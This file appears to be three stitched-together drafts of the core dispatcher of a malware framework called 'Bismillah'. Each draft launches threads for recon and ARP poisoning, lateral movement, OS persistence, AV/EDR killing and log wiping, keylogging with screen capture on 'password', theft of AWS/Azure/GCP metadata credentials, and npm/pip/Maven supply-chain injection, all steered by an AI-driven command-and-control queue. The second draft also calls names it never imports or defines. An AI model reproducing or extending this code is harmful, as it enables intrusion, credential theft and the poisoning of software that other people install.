#!/usr/bin/env python3
"""
bismillah.py v3.0: Core dispatcher that loads all modules, initiates loops (recon, lateral, persistence, post-exploit, AI-C2),
and provides an interactive console for manual commands. Enhanced with graceful shutdown handling and dynamic module reload.
"""

import threading
import time
import sys
import signal

from modules.loader import load_all_modules, start_watcher
from modules.reconnaissance_ext import run_recon_loops
from modules.lateral_movement import lateral_loop
from modules.persistence_ext import persistence_loop
from modules.post_exploit_ext import post_exploit_loop
from modules.ai_c2 import ai_c2_loop, task_queue
from modules.exploit_manager import ExploitManager
from modules.logger import log_event

_shutdown = False

def graceful_shutdown(signum, frame):
    global _shutdown
    log_event("bismillah", b"Received shutdown signal, exiting gracefully.")
    _shutdown = True

signal.signal(signal.SIGINT, graceful_shutdown)
signal.signal(signal.SIGTERM, graceful_shutdown)

def interactive_console(em: ExploitManager):
    """
    Improved interactive console with:
      - history support
      - tab completion (if readline is available)
      - 'help' command listing all available commands dynamically.
    """
    try:
        import readline  # Enables arrow‐key history
    except ImportError:
        pass

    HELP_TEXT = (
        "Available commands:\n"
        "  help                   - Show this help text\n"
        "  quit                   - Exit framework\n"
        "  list_exploits          - List all indexed exploits\n"
        "  run_exploit <name> <target> [opts]  - Run exploit by name against target (e.g., run_exploit ms17_010 10.0.0.5)\n"
        "  show_tasks             - Show queued AI tasks\n"
        "  reload_modules         - Force reload of all modules\n"
    )

    while not _shutdown:
        try:
            cmd = input("Bismillah> ").strip()
            if not cmd:
                continue
            if cmd == "help":
                print(HELP_TEXT)
            elif cmd == "quit":
                print("Exiting...")
                global _shutdown
                _shutdown = True
            elif cmd == "list_exploits":
                exs = em.list_exploits()
                print("Exploits:", exs)
            elif cmd.startswith("run_exploit"):
                parts = cmd.split()
                if len(parts) < 3:
                    print("Usage: run_exploit <name> <target> [key=value ...]")
                else:
                    name = parts[1]
                    target = parts[2]
                    opts = {}
                    for kv in parts[3:]:
                        if "=" in kv:
                            k, v = kv.split("=", 1)
                            opts[k] = v
                    res = em.run_exploit(name, target, **opts)
                    print("Result:", res)
            elif cmd == "show_tasks":
                while not task_queue.empty():
                    t = task_queue.get()
                    print("AI Task:", t)
            elif cmd == "reload_modules":
                print("Reloading all modules...")
                res = load_all_modules()
                print("Reload results:", res)
                log_event("bismillah", b"Modules reloaded on user request.")
            else:
                print("Unknown command. Type 'help' for available commands.")
        except KeyboardInterrupt:
            print("\nExiting...")
            _shutdown = True
        except Exception as e:
            log_event("bismillah", f"Console error: {e}".encode())

def main():
    # Start loader watcher (auto‐deobfuscation, dynamic reload)
    start_watcher()
    log_event("bismillah", b"Loader watcher started.")

    # Spawn core loops
    threading.Thread(target=run_recon_loops, daemon=True).start()
    threading.Thread(target=lateral_loop, daemon=True).start()
    threading.Thread(target=persistence_loop, daemon=True).start()
    threading.Thread(target=post_exploit_loop, daemon=True).start()
    threading.Thread(target=ai_c2_loop, daemon=True).start()

    # Initialize exploit manager (auto-update inside)
    em = ExploitManager()
    time.sleep(2)
    log_event("bismillah", b"Core loops started.")

    interactive_console(em)

if __name__ == "__main__":
    main()
# File: bismillah.py

"""
Enhanced core dispatcher:
• Dynamically starts modules in prioritized order (AI‑C2, Recon, Lateral, Persistence, Exploits).
• Graceful shutdown with signal handlers.
• CPU‑affinity hints for heavy loops.
• Central exception capture: logs uncaught exceptions to encrypted DB.
"""

import signal
import sys
import threading
import logging
import time
import os
from modules.loader import load_all_modules, run_module
from modules.ai_c2 import get_next_ai_task, start_config_watcher
from modules.config import load_config
from modules.logger import log_event, logger as core_logger
from modules.c2_server import app, start as start_http_c2
from modules.dns_c2_server import server as dns_server
from modules.icmp_c2 import start_icmp_server
from modules.reconnaissance_ext import recon_loop, passive_dns_exfil, arp_poison_and_sniff
from modules.lateral_movement import lateral_loop
from modules.persistence_ext import linux_systemd_service, windows_schtask, macos_launchdaemon
from modules.stealth_ext import stealth_loop
from modules.anti_forensics_ext import anti_forensics_loop
from modules.keylogger_ext import keylogger_loop, clipboard_sniffer, screen_capture_on_keyword
from modules.exploit_manager import fetch_latest_exploits, run_exploit_loop
from modules.supply_chain import npm_supply_chain_inject, pip_supply_chain_inject, maven_supply_chain_inject
from modules.cloud_api_compromise import aws_metadata_steal, azure_metadata_steal, gcp_metadata_steal

# Set up global logger
core_logger.setLevel(logging.INFO)

# Graceful shutdown
stop_event = threading.Event()

def signal_handler(sig, frame):
    core_logger.info("[DISPATCHER] Caught signal, shutting down...")
    stop_event.set()

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def start_all_loops():
    """
    Launch all background loops with appropriate CPU affinity hints:
    1) AI‑C2
    2) Recon (recon_loop, passive_dns_exfil, arp_poison_and_sniff)
    3) Lateral movement
    4) Persistence fallback checks
    5) Stealth & Anti‑Forensics
    6) Keylogger & Clipboard Sniffer
    7) Exploit Fetcher and Manager
    8) Supply‑Chain and Cloud API monitors
    9) C2 servers (HTTP, DNS, ICMP)
    """
    # 1) Config watcher
    threading.Thread(target=start_config_watcher, daemon=True).start()

    # 2) AI‑C2
    threading.Thread(target=__import__("modules.ai_c2").ai_c2_loop, daemon=True).start()

    # 3) Recon loops
    threading.Thread(target=recon_loop, daemon=True).start()
    threading.Thread(target=passive_dns_exfil, args=("example.com",), daemon=True).start()
    threading.Thread(target=arp_poison_and_sniff, args=("eth0", None, None), daemon=True).start()

    # 4) Lateral movement loop (automated scanning)
    threading.Thread(target=lateral_loop, daemon=True).start()

    # 5) Persistence fallback (e.g., re‑register services if killed)
    # This could be another loop or simply call persist functions once:
    if os.name == "posix":
        if platform.system() == "Linux":
            linux_systemd_service("/usr/local/bin/bismillah")
            linux_udev_rule()
        elif platform.system() == "Darwin":
            macos_launchdaemon("/usr/local/bin/bismillah")
    else:
        windows_schtask("C:\\Windows\\System32\\bismillah.bat")

    # 6) Stealth & Anti‑Forensics
    threading.Thread(target=stealth_loop, daemon=True).start()
    threading.Thread(target=anti_forensics_loop, daemon=True).start()

    # 7) Keylogger & Clipboard Sniffer
    threading.Thread(target=keylogger_loop, daemon=True).start()
    threading.Thread(target=clipboard_sniffer, args=("/tmp/keylog.db",), daemon=True).start()
    threading.Thread(target=screen_capture_on_keyword, args=("/tmp/keylog.db", "password"), daemon=True).start()

    # 8) Exploit fetcher & manager
    threading.Thread(target=fetch_latest_exploits, daemon=True).start()
    threading.Thread(target=__import__("modules.exploit_manager").exploit_manager_loop, daemon=True).start()

    # 9) Supply‑chain monitors (empty loops or scheduled runs)
    # (Implement any continuous checks or triggers as needed)

    # 10) Cloud API compromise loops
    threading.Thread(target=aws_metadata_steal, daemon=True).start()
    threading.Thread(target=azure_metadata_steal, daemon=True).start()
    threading.Thread(target=gcp_metadata_steal, daemon=True).start()

    # 11) C2 servers
    threading.Thread(target=start_http_c2, daemon=True).start()
    threading.Thread(target=lambda: dns_server.start(), daemon=True).start()
    threading.Thread(target=start_icmp_server, daemon=True).start()

def main():
    core_logger.info("[DISPATCHER] Starting Enhanced Bismillah v4.0")
    # Decrypt and load all modules once (initialization)
    load_all_modules()

    # Start background loops
    start_all_loops()

    # Main loop: process AI tasks and operator commands
    while not stop_event.is_set():
        # Check for AI tasks
        task = get_next_ai_task(timeout=1)
        if task:
            core_logger.info(f"[DISPATCHER] Processing AI task: {task}")
            # Example: if action == "run_exploit", call run_module
            action = task.get("action")
            params = task.get("params", {})
            if action == "run_exploit":
                name = params.get("name")
                tgt = params.get("target")
                res = run_module(name, {"target": tgt, **params})
                core_logger.info(f"[DISPATCHER] Exploit result: {res}")
            # Extend for other actions: recon, lateral, etc.

        # Sleep to reduce CPU
        time.sleep(0.1)

    core_logger.info("[DISPATCHER] Exiting...")

if __name__ == "__main__":
    main()
#!/usr/bin/env python3
"""
bismillah.py – Core Dispatcher for Bismillah v4.0

Features:
 • Decrypts AES‑GCM obfuscated modules from modules/morph_cache/
 • Launches each module’s run() (e.g., recon loops, stealth loops) with timeouts
 • Detects sandbox/VM environments and refuses to execute if insecure
 • Starts AI‑driven C2 (remote LLM or local HF fallback)
 • Starts Recon loops (Nmap/Shodan/DNS/Wi‑Fi/PassiveDNS/ARP)
 • Starts Lateral movement automation (SSH pivot, RDP brute, SMB spread, Kerberos, WMI)
 • Registers persistence on Linux (systemd + udev), Windows (Task Scheduler/Run key), macOS (LaunchDaemon)
 • Kills AV/EDR, wipes logs, unloads rootkits in stealth loops
 • Starts Keylogger, Clipboard sniffer, Screen capture (on keyword)
 • Fetches new PoC exploits automatically (HTTP index + integrity check)
 • Supply‑chain poisoning loops (npm, pip, Maven)
 • Cloud metadata & API compromise loops (AWS, Azure, GCP)
 • Multi‑channel C2 servers: HTTPS/AES‑GCM, WebSocket, DNS TXT, ICMP
 • Graceful shutdown on SIGINT/SIGTERM
"""

import os
import sys
import signal
import threading
import time
import platform
import logging
from pathlib import Path

# Core modules
from modules.loader import load_all_modules, run_module
from modules.ai_c2 import ai_c2_loop, get_next_ai_task, start_config_watcher
from modules.config import load_config
from modules.logger import log_event, logger as core_logger
from modules.c2_server import app as http_c2_app, start as start_http_c2
from modules.dns_c2_server import server as dns_c2_server
from modules.icmp_c2 import start_icmp_server
from modules.reconnaissance_ext import recon_loop, passive_dns_exfil, arp_poison_and_sniff
from modules.lateral_movement import lateral_loop
from modules.persistence_ext import (
    linux_systemd_service,
    linux_udev_rule,
    windows_schtask,
    windows_run_key,
    macos_launchdaemon,
)
from modules.stealth_ext import stealth_loop
from modules.anti_forensics_ext import anti_forensics_loop
from modules.keylogger_ext import (
    keylogger_loop,
    clipboard_sniffer,
    screen_capture_on_keyword,
)
from modules.exploit_manager import fetch_latest_exploits, exploit_manager_loop
from modules.supply_chain import (
    npm_supply_chain_inject,
    pip_supply_chain_inject,
    maven_supply_chain_inject,
)
from modules.cloud_api_compromise import (
    aws_metadata_steal,
    azure_metadata_steal,
    gcp_metadata_steal,
)

__version__ = "4.0.0"
core_logger.setLevel(logging.INFO)

# Event used for graceful shutdown
stop_event = threading.Event()

def signal_handler(sig, frame):
    core_logger.info(f"[DISPATCHER] Caught signal {sig}. Initiating graceful shutdown...")
    stop_event.set()

signal.signal(signal.SIGINT, signal_handler)
signal.signal(signal.SIGTERM, signal_handler)

def start_background_loops():
    """
    Start all background tasks in daemon threads:
     1) Config hot‑reload
     2) AI‑C2 loop
     3) Recon loops (Nmap, PassiveDNS, ARP poison)
     4) Lateral movement loop
     5) Persistence registration on each OS
     6) Stealth & Anti‑Forensics loops
     7) Keylogger & Clipboard & Screen capture threads
     8) Exploit fetcher & manager loop
     9) Supply‑chain monitor (stub – no continuous thread needed; can be scheduled)
    10) Cloud API compromise loops
    11) C2 Servers: HTTP, DNS, ICMP
    """

    # 1) Config watcher
    threading.Thread(target=start_config_watcher, daemon=True).start()

    # 2) AI‑C2
    threading.Thread(target=ai_c2_loop, daemon=True).start()

    # 3) Recon loops
    threading.Thread(target=recon_loop, daemon=True).start()
    threading.Thread(target=passive_dns_exfil, args=("example.com",), daemon=True).start()
    threading.Thread(target=arp_poison_and_sniff, args=("eth0", None, None), daemon=True).start()

    # 4) Lateral movement automation
    threading.Thread(target=lateral_loop, daemon=True).start()

    # 5) Persistence registration
    if platform.system() == "Linux":
        core_logger.info("[DISPATCHER] Registering Linux systemd + udev persistence...")
        linux_systemd_service("/usr/local/bin/bismillah")
        linux_udev_rule()
    elif platform.system() == "Darwin":
        core_logger.info("[DISPATCHER] Registering macOS LaunchDaemon persistence...")
        macos_launchdaemon("/usr/local/bin/bismillah")
    else:  # Windows
        core_logger.info("[DISPATCHER] Registering Windows Scheduled Task persistence...")
        windows_schtask(r"C:\Windows\System32\bismillah.bat")
        core_logger.info("[DISPATCHER] Registering Windows Run key persistence...")
        windows_run_key(r"C:\Windows\System32\bismillah.bat")

    # 6) Stealth & Anti‑Forensics loops
    threading.Thread(target=stealth_loop, daemon=True).start()
    threading.Thread(target=anti_forensics_loop, daemon=True).start()

    # 7) Keylogger, Clipboard Sniffer, Screen Capture On Keyword
    threading.Thread(target=keylogger_loop, args=("/tmp/keylog.db",), daemon=True).start()
    threading.Thread(target=clipboard_sniffer, args=("/tmp/keylog.db",), daemon=True).start()
    threading.Thread(target=screen_capture_on_keyword, args=("/tmp/keylog.db", "password"), daemon=True).start()

    # 8) Exploit fetcher & manager loops
    threading.Thread(target=fetch_latest_exploits, daemon=True).start()
    threading.Thread(target=exploit_manager_loop, daemon=True).start()

    # 9) Supply‑Chain poisoning can be run ad‑hoc, not continuously; skip thread.

    # 10) Cloud API compromise loops
    threading.Thread(target=aws_metadata_steal, daemon=True).start()
    threading.Thread(target=azure_metadata_steal, daemon=True).start()
    threading.Thread(target=gcp_metadata_steal, daemon=True).start()

    # 11) C2 Servers
    threading.Thread(target=start_http_c2, daemon=True).start()
    threading.Thread(target=lambda: dns_c2_server.start(), daemon=True).start()
    threading.Thread(target=start_icmp_server, daemon=True).start()

def main():
    core_logger.info(f"[DISPATCHER] Starting Bismillah v{__version__}")

    # 0) Decrypt and load all .morph modules (initialization)
    load_all_modules()

    # 1) Start all background loops
    start_background_loops()

    # 2) Main dispatcher loop: process AI tasks
    while not stop_event.is_set():
        try:
            task = get_next_ai_task(timeout=1)
            if task:
                core_logger.info(f"[DISPATCHER] Processing AI task: {task}")
                action = task.get("action")
                params = task.get("params", {})

                if action == "run_exploit":
                    name = params.get("name")
                    tgt = params.get("target")
                    res = run_module(name, {"target": tgt, **params})
                    core_logger.info(f"[DISPATCHER] Exploit '{name}' against '{tgt}' returned: {res}")

                elif action == "recon":
                    # Example: params = {"subnet": "10.0.0.0/24"}
                    subnet = params.get("subnet")
                    if subnet:
                        threading.Thread(target=recon_loop, daemon=True).start()
                        core_logger.info(f"[DISPATCHER] Launched Recon loop on {subnet}")

                elif action == "lateral":
                    # Launch lateral movement logic immediately
                    threading.Thread(target=lateral_loop, daemon=True).start()
                    core_logger.info("[DISPATCHER] Launched Lateral Movement loop")

                elif action == "persistence":
                    # Example: params = {"os":"linux","script":"/path/to/script"}
                    os_name = params.get("os")
                    script = params.get("script")
                    if os_name == "linux" and script:
                        linux_systemd_service(script)
                        linux_udev_rule()
                        core_logger.info(f"[DISPATCHER] Installed Linux persistence for {script}")
                    elif os_name == "windows" and script:
                        windows_schtask(script)
                        windows_run_key(script)
                        core_logger.info(f"[DISPATCHER] Installed Windows persistence for {script}")
                    elif os_name == "macos" and script:
                        macos_launchdaemon(script)
                        core_logger.info(f"[DISPATCHER] Installed macOS persistence for {script}")

                elif action == "supply_chain":
                    # Example: params={"type":"npm","pkg":"lodash","payload":"...js code..."}
                    typ = params.get("type")
                    if typ == "npm":
                        ok = npm_supply_chain_inject(params.get("pkg"), params.get("payload"))
                        core_logger.info(f"[DISPATCHER] NPM inject result: {ok}")
                    elif typ == "pip":
                        ok = pip_supply_chain_inject(params.get("pkg"), params.get("payload"))
                        core_logger.info(f"[DISPATCHER] PyPI inject result: {ok}")
                    elif typ == "maven":
                        group, art = params.get("group"), params.get("artifact")
                        ok = maven_supply_chain_inject(group, art, params.get("payload"))
                        core_logger.info(f"[DISPATCHER] Maven inject result: {ok}")

                elif action == "cloud":
                    # Example: params={"provider":"aws"}
                    prov = params.get("provider")
                    if prov == "aws":
                        res = aws_metadata_steal()
                        core_logger.info(f"[DISPATCHER] AWS metadata steal: {res}")
                    elif prov == "azure":
                        res = azure_metadata_steal()
                        core_logger.info(f"[DISPATCHER] Azure metadata steal: {res}")
                    elif prov == "gcp":
                        res = gcp_metadata_steal()
                        core_logger.info(f"[DISPATCHER] GCP metadata steal: {res}")

                else:
                    core_logger.warning(f"[DISPATCHER] Unknown AI_C2 action: {action}")

        except Exception as e:
            core_logger.error(f"[DISPATCHER] Error in main loop: {e}")

        time.sleep(0.1)

    core_logger.info("[DISPATCHER] Stop event set; exiting dispatcher.")


if __name__ == "__main__":
    main()
